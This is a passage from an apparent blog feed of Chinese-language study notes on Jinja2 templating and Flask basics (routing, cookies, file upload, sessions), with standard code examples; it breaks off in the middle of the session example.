循环</h2><p>jinja2中的for循环用于迭代Python的数据类型，包括列表，元组和字典。在jinja2中不存在while循环。</p><p>迭代列表</p><figure class="highlight django"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs django"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span></span><br><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">for</span></span> user <span class="hljs-keyword">in</span> users %&#125;</span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span></span><span class="hljs-template-variable">&#123;&#123; user.username|<span class="hljs-name">title</span> &#125;&#125;</span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span></span><br><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endfor</span></span> %&#125;</span><br><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>迭代字典</p><figure class="highlight django"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs django"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">dl</span>&gt;</span></span><br><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">for</span></span> key, value <span class="hljs-keyword">in</span> my_dict.iteritems() %&#125;</span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">dt</span>&gt;</span></span><span class="hljs-template-variable">&#123;&#123; key &#125;&#125;</span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">dt</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">dd</span>&gt;</span></span><span class="hljs-template-variable">&#123;&#123; value&#125;&#125;</span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">dd</span>&gt;</span></span><br><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endfor</span></span> %&#125;</span><br><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">dl</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>在for循环中，jinja2还提供了一些特殊的变量，用以来获取当前的遍历状态：</p><table><thead><tr><th>变量</th><th>作用</th></tr></thead><tbody><tr><td>loop.index</td><td>当前迭代的索引（从1开始）</td></tr><tr><td>loop.index0</td><td>当前迭代的索引（从0开始）</td></tr><tr><td>loop.first</td><td>是否是第一次迭代，返回bool</td></tr><tr><td>loop.last</td><td>是否是最后一次迭代，返回bool</td></tr><tr><td>loop.length</td><td>序列中的项目数量</td></tr><tr><td>loop.revindex</td><td>到循环结束的次数（从1开始）</td></tr><tr><td>loop.revindex0</td><td>到循环结束的次数(从0开始）</td></tr></tbody></table><h2 id="0x08-宏"><a href="#0x08-宏" class="headerlink" title="0x08 宏"></a>0x08 宏</h2><p>宏类似于Python中的函数（其实就是函数的用法），我们在宏中定义行为，还可以进行传递参数。</p><figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs twig"><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-keyword">macro</span></span> input(name,age=18) %&#125;</span><br><span class="xml"> <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&#x27;text&#x27;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;</span></span></span><span class="hljs-template-variable">&#123;&#123; name &#125;&#125;</span><span class="xml"><span class="hljs-tag"><span class="hljs-string">&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;</span></span></span><span class="hljs-template-variable">&#123;&#123; age &#125;&#125;</span><span class="xml"><span class="hljs-tag"><span class="hljs-string">&quot;</span> &gt;</span></span><br><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-keyword">endmacro</span></span> %&#125;</span><br></code></pre></td></tr></table></figure><p>调用:</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span></span><span class="hljs-template-variable">&#123;&#123; <span class="hljs-name"><span class="hljs-builtin-name">input</span></span>(<span class="hljs-name">&#x27;daxin&#x27;</span>) &#125;&#125;</span><span class="xml"> <span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span></span><span class="hljs-template-variable">&#123;&#123; <span class="hljs-name"><span class="hljs-builtin-name">input</span></span>(<span class="hljs-name">&#x27;daxin&#x27;</span>,<span class="hljs-attr">age</span>=<span class="hljs-number">20</span>) &#125;&#125;</span><span class="xml"> <span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><br></code></pre></td></tr></table></figure><h2 id="0x09-继承"><a href="#0x09-继承" class="headerlink" title="0x09 继承"></a>0x09 继承</h2><p>jinja2中最强大的部分就是模板继承。模板继承允许我们创建一个基本文件，其他文件从该骨架文件继承，然后针对自己需要的地方进行修改。</p><p>骨架文件中，block关键字表示其包涵的内容可以进行修改。</p><p>如：</p><figure class="highlight django"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs django"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span></span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">block</span></span> title %&#125;</span><span class="xml">Leticia&#x27;s Blog</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endblock</span></span> %&#125;</span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>我们要替换的时候</p><figure class="highlight django"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs django"><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">block</span></span> title %&#125;</span><span class="xml">xxx&#x27;s Blog</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endblock</span></span> %&#125;</span><br></code></pre></td></tr></table></figure><h2 id="0x10-渲染模板"><a href="#0x10-渲染模板" class="headerlink" title="0x10 渲染模板"></a>0x10 渲染模板</h2><p>默认情况下，Flask在程序文件夹中的templates子文件夹中寻找模板。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> jinja2<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, render_template<br><br>    app = Flask(__name__)<br><br><span class="hljs-meta">    @app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">index</span>():</span><br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>)<br><br><span class="hljs-meta">    @app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/user/&lt;name&gt;&#x27;</span></span>)</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">user</span>(<span class="hljs-params">name</span>):</span><br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;user.html&#x27;</span>, name=name)<br></code></pre></td></tr></table></figure><p>render_template 函数的第一个参数是模板的文件名（index.html，user.html），随后的参数都是键值对（name=name），表示模板中变量的真实值。</p>]]></content>
    
    
    <categories>
      
      <category>python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>python-flask模块学习</title>
    <link href="/2018/05/25/python-flask%E6%A8%A1%E5%9D%97%E5%AD%A6%E4%B9%A0/"/>
    <url>/2018/05/25/python-flask%E6%A8%A1%E5%9D%97%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>最近想接触一下python作为后端的环境，所以准备从flask模块开始学习，记录一下用法，当作笔记。</p><h2 id="0x01-flask"><a href="#0x01-flask" class="headerlink" title="0x01 flask"></a>0x01 flask</h2><p>Flask是一个使用 Python 编写的轻量级 Web 应用框架。其 WSGI 工具箱采用 Werkzeug ，模板引擎则使用 Jinja2 。Flask使用 BSD 授权。因为它使用简单的核心，用 extension 增加其他功能。Flask没有默认使用的数据库、窗体验证工具。</p><h2 id="0x02-安装"><a href="#0x02-安装" class="headerlink" title="0x02 安装"></a>0x02 安装</h2><p>安装只需在具有python环境的计算机命令行中，输入</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">pip <span class="hljs-keyword">install</span> flask<br></code></pre></td></tr></table></figure><h2 id="0x03-基础步骤"><a href="#0x03-基础步骤" class="headerlink" title="0x03 基础步骤"></a>0x03 基础步骤</h2><ul><li><p>我们在使用flask时，必须先要导入库，即</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask<br></code></pre></td></tr></table></figure></li><li><p>接下来，我们创建一个该类的实例，第一个参数是应用模块或者包的名称。如果使用单一的模块,就使用__name__</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">app</span> = Flask(__name__)<br></code></pre></td></tr></table></figure></li><li><p>然后，我们使用 route() 装饰器告诉 Flask 什么样的URL 能触发我们的函数。根目录为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span></span>)</span><br></code></pre></td></tr></table></figure></li><li><p>这个函数的名字也在生成 URL 时被特定的函数采用，这个函数返回我们想要显示在用户浏览器中的信息。如：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">hello</span><span class="hljs-params">()</span></span><span class="hljs-symbol">:</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Hello World!&quot;</span><br></code></pre></td></tr></table></figure></li><li><p>最后用 run() 函数来让应用运行在本地服务器上。 其中 if <strong>name</strong> == ‘<strong>main</strong>‘: 确保服务器只会在该脚本被 Python 解释器直接执行的时候才会运行，而不是作为模块导入的时候。即：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    app.<span class="hljs-builtin-name">run</span>()<br></code></pre></td></tr></table></figure></li></ul><p>这是最基础的操作所需要的五步，组合起来就是：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask<br>app = Flask(__name__)<br> <br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span></span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">hello</span>():</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Hello World!&quot;</span><br> <br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    app.run()<br></code></pre></td></tr></table></figure><p>然后在这个.py文件的目录下，打开命令行，使用python xxx.py的方式运行，就会部署到本地服务器的5000端口，我们通过浏览器访问127.0.0.1:5000，就会看到web页面的输出。</p><h2 id="0x04-基础函数"><a href="#0x04-基础函数" class="headerlink" title="0x04 基础函数"></a>0x04 基础函数</h2><h4 id="设置公网访问"><a href="#设置公网访问" class="headerlink" title="设置公网访问"></a>设置公网访问</h4><p>web服务打开时默认是只能通过本机访问的，如果想要通过外网访问，就得先禁用了 debug 然后修改调用 run() 的方法使服务器公开。</p><p>实例：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">app.<span class="hljs-builtin-name">run</span>(<span class="hljs-attribute">host</span>=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>)<br></code></pre></td></tr></table></figure><h4 id="设置路由"><a href="#设置路由" class="headerlink" title="设置路由"></a>设置路由</h4><p>上面的基础步骤已经提到，由route()函数来设置访问的url，如果我们有多个函数，就可以分别用route()装饰器将不同的函数绑定到不同的url上。</p><p>实例</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-variable">@app</span>.route(<span class="hljs-string">&#x27;/&#x27;</span>)<br>def index():<br>    return <span class="hljs-string">&#x27;Index Page&#x27;</span><br><br><span class="hljs-variable">@app</span>.route(<span class="hljs-string">&#x27;/hello&#x27;</span>)<br>def hello():<br>    return <span class="hljs-string">&#x27;Hello World&#x27;</span><br>    <br><span class="hljs-variable">@app</span>.route(<span class="hljs-string">&#x27;/test&#x27;</span>)<br>def test():<br>    return <span class="hljs-string">&#x27;Test&#x27;</span><br></code></pre></td></tr></table></figure><h4 id="路径变量"><a href="#路径变量" class="headerlink" title="路径变量"></a>路径变量</h4><p>路径变量的意思就如同它的名字一样，路径中的一部分是可以改变的，主要用于受变量影响的可变路径，用法是/path/<a href="converter:varname">converter:varname</a>，并且在变量之前还可以使用转换器来改变数据类型</p><table><thead><tr><th>转换器</th><th>作用</th></tr></thead><tbody><tr><td>string</td><td>默认选项，接受除了斜杠之外的字符串</td></tr><tr><td>int</td><td>接受整数</td></tr><tr><td>float</td><td>接受浮点数</td></tr><tr><td>path</td><td>和string类似，不过可以接受带斜杠的字符串</td></tr><tr><td>any</td><td>匹配任何一种转换器</td></tr><tr><td>uuid</td><td>接受UUID字符串</td></tr></tbody></table><p>实例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/user/&lt;username&gt;&#x27;</span></span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show_user_profile</span>(<span class="hljs-params">username</span>):</span><br>    <span class="hljs-comment"># show the user profile for that user</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;User %s&#x27;</span> % username<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/post/&lt;int:post_id&gt;&#x27;</span></span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show_post</span>(<span class="hljs-params">post_id</span>):</span><br>    <span class="hljs-comment"># show the post with the given id, the id is an integer</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Post %d&#x27;</span> % post_id<br></code></pre></td></tr></table></figure><h4 id="构造URL"><a href="#构造URL" class="headerlink" title="构造URL"></a>构造URL</h4><p>flask中可以用 url_for(‘方法名’) 来给指定的函数构造 URL。主参数是方法名，可以额外传入对应 URL 规则的变量部分的命名参数。</p><p>实例：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">url_for</span><span class="hljs-params">(<span class="hljs-string">&#x27;index&#x27;</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">url_for</span><span class="hljs-params">(<span class="hljs-string">&#x27;user&#x27;</span>, username=<span class="hljs-string">&#x27;jack&#x27;</span>)</span></span><br></code></pre></td></tr></table></figure><h4 id="HTTP方法"><a href="#HTTP方法" class="headerlink" title="HTTP方法"></a>HTTP方法</h4><p>HTTP （与 Web 应用会话的协议）有许多不同的访问 URL 方法。默认情况下，路由只回应 GET 请求，但是通过 route() 装饰器传递 methods 参数可以改变这个行为。用法是app.route(‘/login’, methods=[‘GET’, ‘POST’])</p><p>实例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/login&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">login</span>():</span><br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        do_the_login()<br>    <span class="hljs-keyword">else</span>:<br>        show_the_login_form()<br></code></pre></td></tr></table></figure><h4 id="静态文件"><a href="#静态文件" class="headerlink" title="静态文件"></a>静态文件</h4><p>动态 web 应用也会需要静态文件，通常是 CSS 和 JavaScript 文件。只要在你的包中或是模块的所在目录中创建一个名为 static 的文件夹，在应用中使用 /static 即可访问。</p><p>实例：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">url<span class="hljs-constructor">_for(&#x27;<span class="hljs-params">static</span>&#x27;, <span class="hljs-params">filename</span>=&#x27;<span class="hljs-params">style</span>.<span class="hljs-params">css</span>&#x27;)</span><br></code></pre></td></tr></table></figure><h4 id="调试模式"><a href="#调试模式" class="headerlink" title="调试模式"></a>调试模式</h4><p>如果你启用了调试支持，服务器会在代码修改后自动重新载入，并在发生错误时提供一个相当有用的调试器。</p><p>实例：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">app.<span class="hljs-builtin-name">debug</span> = <span class="hljs-literal">True</span><br>app.<span class="hljs-builtin-name">run</span>()<br></code></pre></td></tr></table></figure><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">app.<span class="hljs-builtin-name">run</span>(<span class="hljs-attribute">debug</span>=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure><h4 id="URL-“-”重定向"><a href="#URL-“-”重定向" class="headerlink" title="URL “/”重定向"></a>URL “/”重定向</h4><p>如果设置route(‘/xxx/‘)访问url时如果结尾带了一个反斜杠，就会自动重定向到不带反斜杠的url中，如果不设置反斜杠，就不会重定向，而是返回一个404错误。</p><p>实例：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-variable">@app</span>.route(<span class="hljs-string">&#x27;/about/&#x27;</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">about</span><span class="hljs-params">()</span></span><span class="hljs-symbol">:</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;The about page&#x27;</span><br></code></pre></td></tr></table></figure><h4 id="模板渲染"><a href="#模板渲染" class="headerlink" title="模板渲染"></a>模板渲染</h4><p>Flask 配备了 Jinja2 模板引擎,python可以通过 render_template() 方法来渲染模板。只需将模板名和关键字的参数传入模板的变量。</p><p>实例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> render_template<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/hello/&#x27;</span></span>)</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/hello/&lt;name&gt;&#x27;</span></span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">hello</span>(<span class="hljs-params">name=<span class="hljs-literal">None</span></span>):</span><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;hello.html&#x27;</span>, name=name)<br></code></pre></td></tr></table></figure><h4 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h4><p>用 Flask 处理文件上传，首先要确保在 HTML 表单中设置 enctype=”multipart/form-data”，已上传的文件存储在内存或是文件系统中一个临时的位置。可以通过请求对象的 files 属性访问它们。每个上传的文件都会存储在这个字典里。它表现近乎为一个标准的 Python file 对象，但它还有一个 save() 方法，这个方法允许你把文件保存到服务器的文件系统上。</p><p>实例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> request<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/upload&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">upload_file</span>():</span><br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        f = request.files[<span class="hljs-string">&#x27;the_file&#x27;</span>]<br>        f.save(<span class="hljs-string">&#x27;/var/www/uploads/uploaded_file.txt&#x27;</span>)<br>    ...<br></code></pre></td></tr></table></figure><h4 id="Cookies"><a href="#Cookies" class="headerlink" title="Cookies"></a>Cookies</h4><p>python flask可以通过 cookies 属性来访问 Cookies，用响应对象的 set_cookie 方法来设置 Cookies。请求对象的 cookies 属性是一个内容为客户端提交的所有 Cookies 的字典。</p><p>实例：</p><p>读取cookies</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> request<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">index</span>():</span><br>    username = request.cookies.get(<span class="hljs-string">&#x27;username&#x27;</span>)<br></code></pre></td></tr></table></figure><p>写入cookies</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> make_response<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">index</span>():</span><br>    resp = make_response(render_template(...))<br>    resp.set_cookie(<span class="hljs-string">&#x27;username&#x27;</span>, <span class="hljs-string">&#x27;the username&#x27;</span>)<br>    <span class="hljs-keyword">return</span> resp<br></code></pre></td></tr></table></figure><h4 id="重定向和错误"><a href="#重定向和错误" class="headerlink" title="重定向和错误"></a>重定向和错误</h4><p>flask可以用 redirect() 函数把用户重定向到其它地方。放弃请求并返回错误代码，用 abort() 函数。</p><p>实例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> abort, redirect, url_for<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">index</span>():</span><br>    <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;login&#x27;</span>))<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/login&#x27;</span></span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">login</span>():</span><br>    abort(<span class="hljs-number">401</span>)<br>    this_is_never_executed()<br></code></pre></td></tr></table></figure><h4 id="日志记录"><a href="#日志记录" class="headerlink" title="日志记录"></a>日志记录</h4><p>Flask预置了日志系统。在我们需要日志记录功能时，只需使用logger函数即可。</p><p>实例</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">app.logger.<span class="hljs-builtin-name">debug</span>(<span class="hljs-string">&#x27;A value for debugging&#x27;</span>)<br>app.logger.<span class="hljs-builtin-name">warning</span>(<span class="hljs-string">&#x27;A warning occurred (%d apples)&#x27;</span>, 42)<br>app.logger.<span class="hljs-builtin-name">error</span>(<span class="hljs-string">&#x27;An error occurred&#x27;</span>)<br></code></pre></td></tr></table></figure><h4 id="session"><a href="#session" class="headerlink" title="session"></a>session</h4><p>flask除请求对象之外，还有一个 session 对象。它允许你在不同请求间存储特定用户的信息。它是在 Cookies 的基础上实现的，并且对 Cookies 进行密钥签名。要使用会话，需要设置一个密钥。</p><p>实例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, session, redirect, url_for, escape, request<br><br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">index</span>():</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;username&#x27;</span> <span class="hljs-keyword">in</span> session:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Logged in as %s&#x27;</span> % escape(session[<span class="hljs-string">&#x27;username&#x27;</span>])<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;You are not logged in&#x27;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/login&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">login</span>():</span><br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        session[<span class="hljs-string">&#x27;username&#x27;</span>] = request.form[<span class="hljs-string">&#x27;username&#x27;</span>]<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;index&#x27;</span>))<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">        &lt;form action=&quot;&quot; method=&quot;post&quot;&gt;</span><br><span class="hljs-string">            &lt;p&gt;&lt;input type=text name=username&gt;</span><br><span class="hljs-string">            &lt;p&gt;&lt;input type=submit value=Login&gt;</span><br><span class="hljs-string">        &lt;/form&gt;</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/logout&#x27;</span></span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">logout</span>():</span><br>    <span class="hljs-comment"># remove the username from the session if 